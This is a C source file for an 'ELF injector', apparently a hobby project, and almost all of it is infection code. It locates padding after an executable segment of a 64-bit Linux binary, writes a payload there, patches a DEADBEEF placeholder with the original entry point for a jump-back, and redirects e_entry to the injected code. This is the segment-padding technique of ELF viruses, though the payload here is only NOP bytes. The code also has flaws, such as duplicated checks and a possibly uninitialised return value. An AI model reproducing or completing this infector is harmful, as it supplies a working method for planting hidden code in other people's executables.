#include "structs.h"
#include <inttypes.h>

/* THE FIRST PART:
        https://www.conradk.com/elf-from-scratch/
        https://linuxvox.com/blog/reading-the-contents-of-an-elf-section-programmatically/
        https://www.man7.org/linux/man-pages/man5/elf.5.html
        1. Read header

*/

// Coloured Error Printer

int verbose = 1;

unsigned char placeholder_payload[] = {0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90};
uint32_t placeholder_payload_size = sizeof(placeholder_payload);

// not sure if this is needed, we might be able to put this somewhere else
#define DEADBEEF_MAGIC 0xDEADBEEFDEADBEEFULL


void f_error(char *error, char *desc) {
  fprintf(stderr, "\e[1;91m%s:\e[0m\n", error);
  fprintf(stderr, "\e[0;91m\t|%s\e[0m\n", desc);
  exit(1);
}

uint64_t read_elf(char *name, size_t prog_size){
	/* READING ELF DATA:
		fp 	(int) 					: file pointer
		inf	(struct stat)		: memory stats 
		mm	(const char *)	: memmory map with mmap
			-> mmap exports file to string, with stats in inf
	*/
	if(prog_size == 0)
		f_error("PAYLOAD", "Payload Size 0 Error");
	int fp = open(name, O_RDONLY); 
	struct stat inf;
	if (fp < 0) 
		f_error("OPEN ELF", "Failed to open elf file");
	if (fstat(fp, &inf)) 
		f_error("ELF STAT", "Unable to retreive stats of ELF file");
	const char *mm = mmap(NULL, inf.st_size, PROT_READ, MAP_PRIVATE, fp, 0);
	if(verbose) fprintf(stderr, "ELF file opened successfully \n");

  // Verifying authenticity & type of ELF file
  // verify authenticity
  if (mm[EI_MAG0] != ELFMAG0 || mm[EI_MAG1] != ELFMAG1 ||
      mm[EI_MAG2] != ELFMAG2 || mm[EI_MAG3] != ELFMAG3)
    f_error("ELF FILE",
            "Binary is not an ELF file, failed ELF header validation");
  // verify 64 bit
  if (mm[EI_CLASS] != ELFCLASS64)
    f_error("ELF FILE", "Binary is not 64 bit, failed ELF header validation");
  else if (verbose)
    fprintf(stderr, "ELF file verified.\n\n");
  // END VERIFY

  /* ELF header
           header (Elf64_Ehdr)		: Elf header, contains info about binary
           phsize (unsigned int)	: Elf program header size
           phnum (unsigned int)		: Elf program header quantity
  */
  Elf64_Ehdr *header = (Elf64_Ehdr *)mm;

  if (header->e_phoff == 0)
    f_error("ELF Header", "ELF file Header struct brokeen?");
  else if (header->e_shoff == 0)
    f_error("ELF Header", "ELF Section Header struct brokeen?");
  else if (verbose) {
    fprintf(stderr, "Elf file header byte pos: %lu\n", header->e_phoff);
    // fprintf(stderr, "Elf section header byte pos: %lu\n", header->e_shoff);
  }

	if( header->e_phoff == 0 )
		f_error("ELF Header", "ELF file Header struct broken");
	else if( header->e_shoff == 0 )
		f_error("ELF Header", "ELF Section Header struct broken");
	else if(verbose){
		fprintf(stderr, "Elf file header byte pos: %lu\n", header->e_phoff);
		//fprintf(stderr, "Elf section header byte pos: %lu\n", header->e_shoff);
	}
	
	unsigned int phnum = header->e_phnum;
	if(verbose){
		fprintf(stderr, "Program header entries:           %d\n", phnum);
		fprintf(stderr, "Program header entry byte size:   0x%x\n", (uint16_t) header->e_phentsize);
		fprintf(stderr, "Program header entry byte offset: 0x%x\n", (uint16_t) header->e_phoff);

		/* idk what I was doing here, this does something I guess fprintf(stderr, "Program header entries:\n");
		for(int i = 0; i < phnum; ++i){
			fprintf(stderr, "\t%2d: ", i+1);
			for(int j = 0; j < phsize; ++j)
				fprintf(stderr, "\e[0;32m%x\e[0m", mm[header->e_phoff+(i*phsize)+j]);
			fprintf(stderr, "\n");
		}
		*/
	}

	/* Program Header
		 pheader (Elf64_Phdr) : Array of programs
	*/

	Elf64_Phdr const *pheader = (Elf64_Phdr *) (mm + header->e_phoff);
	uint64_t start;

	for(int i = 0; i < phnum; ++i){
		if (pheader[i].p_filesz > 0 && (pheader[i].p_flags & PF_X) && (pheader[i].p_filesz == pheader[i].p_memsz)){

			start = pheader[i].p_memsz + pheader[i].p_offset;
			fprintf(stderr, "\nFOUND VALID PROGRAM HEADER TO INFECT, at %lu, p%d\n", start, i+1);

			if(verbose){
				fprintf(stderr, "\tElf program header mem size:             0x%lx\n", pheader[i].p_memsz);
				fprintf(stderr, "\tElf program file size:                   0x%lx\n", pheader[i].p_filesz);
				fprintf(stderr, "\tElf program header byte offset:          0x%lx\n", pheader[i].p_offset);
				fprintf(stderr, "\tElf program header physical address:     0x%lx\n", pheader[i].p_paddr);
				fprintf(stderr, "\tElf program header byte virtual address: 0x%lx\n", pheader[i].p_vaddr);
			}

			uint64_t nh = -1;
			for(int j = 0; j < phnum; ++j)
				if(pheader[j].p_offset > start && pheader[j].p_filesz > 0){
					if(nh == -1) nh = pheader[j].p_offset;
					else nh = (nh > pheader[j].p_offset) ? pheader[j].p_offset : nh;
				}
			nh--;
			if(prog_size > nh-start)
				f_error("PAYLOAD", "Not enough padding, payload too large!");
			fprintf(stderr, "\n");
			fprintf(stderr, "START BYTE:   0x%lx\n", start);
			fprintf(stderr, "END BYTE:     0x%lx\n", nh);
			fprintf(stderr, "BYTES SIZE:   %lu\n", nh - start);

		}
	}
	// cleaning up memory
	close(fp);

  munmap((void *)mm, inf.st_size);

  return start;
}


void write_injection(char *target_path, Elf64_Ehdr *header,
                     unsigned char *payload_data, uint32_t payload_len,
                     struct InjectionMetadata meta) {
  int fd = open(target_path, O_RDWR);
  if (fd < 0)
    f_error("Write injection", "Failed to open target binary for writing");

  if (lseek(fd, meta.target_padding_offset, SEEK_SET) < 0)
    f_error("Write injection", "Failed to seek to padding offset");

  if (write(fd, payload_data, payload_len) != (ssize_t)payload_len)
    f_error("Write injection", "Failed to write payload");

  if (verbose)
    fprintf(stderr, "Wrote %u bytes of payload at file offset 0x%lx\n",
            payload_len, meta.target_padding_offset);

  int patched = 0;
  for (uint32_t i = 0; i + 8 <= payload_len; ++i) {
    uint64_t candidate;
    memcpy(&candidate, payload_data + i, 8);
    if (candidate == DEADBEEF_MAGIC) {

      off_t patch_off = (off_t)(meta.target_padding_offset + i);
      if (lseek(fd, patch_off, SEEK_SET) < 0)
        f_error("Write injection", "Failed to seek to DEADBEEF patch site");
      if (write(fd, &meta.original_entry, 8) != 8)
        f_error("Write injection",
                "Failed to patch DEADBEEF with original entry");
      if (verbose)
        fprintf(stderr,
                "Patched DEADBEEF placeholder at payload+%u -> original "
                "entry 0x%lx\n",
                i, meta.original_entry);
      patched = 1;
      break;
    }
  }
  if (!patched && verbose)
    fprintf(stderr, "DEADBEEF magic not found in payload; jump-back not patched.\n");

  uint64_t elf_entry_offset = 0x18;
  if (lseek(fd, elf_entry_offset, SEEK_SET) < 0)
    f_error("Writing injection", "Failed to seek to e_entry");

  uint64_t new_entry = meta.target_vaddr;
  if (write(fd, &new_entry, sizeof(new_entry)) != sizeof(new_entry))
    f_error("Writing injection", "Failed to patch e_entry");

  if (verbose)
    fprintf(stderr, "Patched e_entry: 0x%lx -> 0x%lx\n", header->e_entry, new_entry);


  // ok im not sure this is needed; increases p_filesz and p_memsz, but the OS
  // might already load without that.
  uint64_t ph_offset = header->e_phoff + meta.text_segment_index * header->e_phentsize;
  Elf64_Phdr phdr;
  if (lseek(fd, ph_offset, SEEK_SET) < 0)
    f_error("Write injection", "Failed to seek to program header");
  if (read(fd, &phdr, sizeof(phdr)) != sizeof(phdr))
    f_error("Write injection", "Failed to read program header");

  phdr.p_filesz += payload_len;
  phdr.p_memsz += payload_len;

  if (lseek(fd, ph_offset, SEEK_SET) < 0)
    f_error("Write injection", "Failed to seek back to program header");
  if (write(fd, &phdr, sizeof(phdr)) != sizeof(phdr))
    f_error("Write injection", "Failed to patch program header");

  if (verbose)
    fprintf(stderr, "Patched program header %d: increased size by %u\n",
            meta.text_segment_index, payload_len);
  close(fd);

}

int main(int argc, char **argv) {
  printf("ELF Injector Initiated, Target binary: \"%s\"\n", argv[1]);
	read_elf(argv[1], 100);
  return 0;
}

